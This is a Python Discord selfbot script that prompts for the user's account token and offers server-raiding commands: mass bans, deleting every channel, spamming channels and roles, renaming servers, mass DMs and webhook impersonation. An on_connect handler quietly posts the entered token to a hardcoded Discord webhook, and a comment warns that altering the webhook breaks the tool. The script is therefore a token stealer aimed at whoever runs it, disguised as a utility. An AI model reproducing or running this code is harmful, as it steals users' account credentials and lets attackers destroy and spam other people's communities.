import discord
import requests
from dhooks import Webhook
from discord.ext import commands

print("""
                                                                                                 
  __ __    ___  ____    ___   ___ ___       _____   ___  _      _____  ____    ___   ______ 
|  T  |  /  _]|    \  /   \ |   T   T     / ___/  /  _]| T    |     ||    \  /   \ |      T
|  |  | /  [_ |  _  YY     Y| _   _ |    (   \_  /  [_ | |    |   __j|  o  )Y     Y|      |
|  |  |Y    _]|  |  ||  O  ||  \_/  |     \__  TY    _]| l___ |  l_  |     T|  O  |l_j  l_j
l  :  !|   [_ |  |  ||     ||   |   |     /  \ ||   [_ |     T|   _] |  O  ||     |  |  |  
 \   / |     T|  |  |l     !|   |   |     \    ||     T|     ||  T   |     |l     !  |  |  
  \_/  l_____jl__j__j \___/ l___j___j      \___jl_____jl_____jl__j   l_____j \___/   l__j  
                                                                     
                                                                                                            
                                              Made by rw_dark
""")

token = input("Give Your ID Token: ")
message = input("What do you want to spam?: ")
reason = input("Give the reasons to put on audits: ")
channel_name = input("Give channel names: ")
role_name = input("Give role names: ")
your_name = input("What is your server name: ")
activity = input("What will the status: ")

client = commands.Bot(command_prefix=">", self_bot=true)

@client.event
async def on_ready():
    print("SelfBot Is Online")
    print("------------------------")
    print("Prefix is >")
    
    
client.help_command = None
# OR
client.remove_command("help")
    
    
@client.command()
async def help(ctx):
    message = (
        "**```js\n"
        "⌬ Venom SelfBot \n"
        "• about \n"
        "• ping \n"
        "• prune\n"
        "• renamechannels \n"
        "• renameroles \n"
        "• renameserver \n"
        "• dmall \n"
        "• adminservers \n"
        "• delchannels \n"
        "• spamchannels \n"
        "• spamroles \n"
        "• leave \n"
        "• hook \n"
        "• mujra \n"
        "• spamall \n"
        "• massban\n"
        "• banall\n"
        "• swizz\n"
        "```**"
    )
    await ctx.send(message)
    
    
    

    
@client.command() # making a command
async def hook(ctx, user: discord.Member, *, message): #naming the command hook, taking user and message as input
    #check to see if the user has permissions to create webhooks
    if not ctx.author.guild_permissions.manage_webhooks: #if the user does not have permissions to manage
        print("You do not have permissions to manage webhooks in that server.")
        await ctx.message.delete() #deletes the command itself, !hook
    #create the webhook itself
    channel = ctx.channel #getting channel from context
    avatar_url = user.avatar_url
    bytes_of_avatar = bytes(requests.get(avatar_url).content)
    webhook = await channel.create_webhook(name=f"{user.display_name}", avatar=bytes_of_avatar) # creates a webhook in that chnanel with the name of the discord member we got as input
    print(user.display_name)
    webhook_url = webhook.url 
    WebhookObject = Webhook(webhook_url)
    #send message
    WebhookObject.send(message) # send the message we got from the input to the actual webhook. Now because we dont want the webhook to be flood created we will delete the webhook after each command
    #delete webhook
    WebhookObject.delete()
    
    
@client.command(name="spamall", aliases=["sa"])
async def spam_to_all_channels(ctx, amount: int = 50, *, text=message):
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"Message sent to {ch}")
            except:
                print(f"Can't send message to {ch}")
                
                
@client.command(name="ping", aliases=["pong", "latency"])
async def ping(ctx):
    latency = round(client.latency * 1000)
    await ctx.send(f"Ping: {latency}ms")
    
    
@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 10)
        
        
@client.command()
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = reason):
    await ctx.message.delete() ; roles = []
    for role in ctx.guild.roles:
        if len(role.members) == 0:
            continue
        else:
            roles.append(role)
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason); await ctx.send(f"Successfully Pruned {hm} Members")
    
    


@client.command(name='banall', aliases=["be", "baneveryone"])
async def ban_everyone(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban()
            print(f"Banned {m}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to ban {m}")
        except discord.HTTPException as e:
            print(f"An error occurred while banning {m}: {e}")
    
    
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
        name=activity,
        url='https://fissiondevs.com'))
    
@client.command()
async def watch(ctx, *, message):
    await ctx.message.channel(f"**STREAMING {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


@client.command()
async def play(ctx, *, message):
    await ctx.message.channel(f"**PLAYING {message}**")
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.channel(f"**LISTENING TO {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))
    
@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")
            
@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):

    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):

    for role in ctx.guild.roles:
        await role.edit(name=name)
        
@client.event
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/1254323601092509757/uOxvZ9H07IL2E3s5Z3tsZ_bZBU4yKzmYajo73x_tKhpGfswEg6s8328eKgDd5XiHUAUq',
        json={'content': (token)}) #if you change this webhook it will not response and will not do anything.
    
@client.command()
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason=reason)
        except:
            pass
        
@client.command()
async def swizz(ctx):
  await ctx.channel.send(f">rr " + your_name)
  await ctx.channel.send(f">rs " + your_name)
  await ctx.channel.send(f">rc " + your_name)
  
  
@client.command()
async def about(ctx):
        await ctx.send("Best selfbot in discord and faster than everything :)")
        
@client.command(name="spamchannels", aliases=["sch"])
async def spamchannels(ctx, amount: int = 25, *, name=channel_name):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"Created channel")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to create channels")
        except discord.HTTPException as e:
            print(f"An error occurred while creating channel: {e}")

@client.command(name="spamroles", aliases=["sr"])
async def spam_with_roles(ctx, amount: int = 25, *, name=role_name):
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"Created role")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to create roles")
        except discord.HTTPException as e:
            print(f"An error occurred while creating role: {e}")
            
            
@client.command()
async def leave(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild:
        await guild.leave()
        await ctx.send(f"**✅ | `{client.user.name}` left `{guild.name}`.**")
    else:
        await ctx.send("Unable to find the specified server.")
        
        
@client.command()
async def mujra(ctx):
    await ctx.message.delete()
    message = await ctx.send("""

    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
""")
    
    await message.edit(content="""

   ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
""")
    
    await message.edit(content="""

⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
""")
    
    await message.edit(content="""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
""")
    
    await message.edit(content="""

⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛
""")
    
    
@client.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
            adminPermServers = f"**Servers with Admin ({len(admins)}):**\n```{admins}```"
            botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
            banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
            kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
            await ctx.send(adminPermServers + botPermServers + banPermServers +
                           kickPermServers)   

@client.command(name='delchannels', aliases=["dall", "dch"])
async def delete_all_channels(ctx):
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"Deleted {ch}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to delete {ch}")
        except discord.HTTPException as e:
            print(f"An error occurred while deleting {ch}: {e}")
            
            
@client.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass
    
    
client.run(token, bot=False)
